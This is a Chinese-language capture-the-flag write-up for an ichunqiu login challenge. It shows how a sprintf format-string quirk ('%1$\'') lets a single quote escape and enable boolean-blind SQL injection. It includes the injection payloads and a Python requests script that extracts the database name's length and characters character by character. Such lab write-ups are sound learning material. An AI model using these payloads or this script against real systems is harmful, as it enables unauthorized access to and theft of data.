SQLi(ichunqiu)
收获颇多的一道题
进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password error!两种，bool盲注
先试试过滤点，发现后缀是%时报错时sprintf参数问题，查找关于sprintf的漏洞找到这篇文章
应该就是单引号逃逸闭合来注入
构造payload:

  • admin%1$\’ or 1=1— 回显password error!
  • admin%1$\’ or 1=2— 回显username error!
    可见可以通过or后面表达式的布尔值真假进行bool盲注
    import requests

import string

url =  "http://5e2c1c23ad44440f9ba4d92351e69666afb9ede320b748f3.changame.ichunqiu.com/"

dir  = string.digits+string.ascii_letters+  "!@#$%^&*()_+{}-="

right =  "password error!"

#猜数据库长度---3

for i in range(30):

	data = {'username':"admin%1$\\' or (length(database())="+str(i)+")-- ",'password':"password"}

	response = requests.post(url,data=data).text

	print("..."+str(i))

	if right in response:

		print("the length of database_name is"+str(i))
		break

    #爆数据库---ctf

database_name = ''

for i in range(1,4):

	for c in dir:

		payload = "admin%1$\\' or (ascii(substr(database(),{0},1))="+str(ord(c))+")-- "

		data = {'username':payload.format(i),'password':"password"}

		response = requests.post(url,data=data).text

		print(payload.format(i)+"...")

		if right in response:

			database_name+=c

print(database_name)
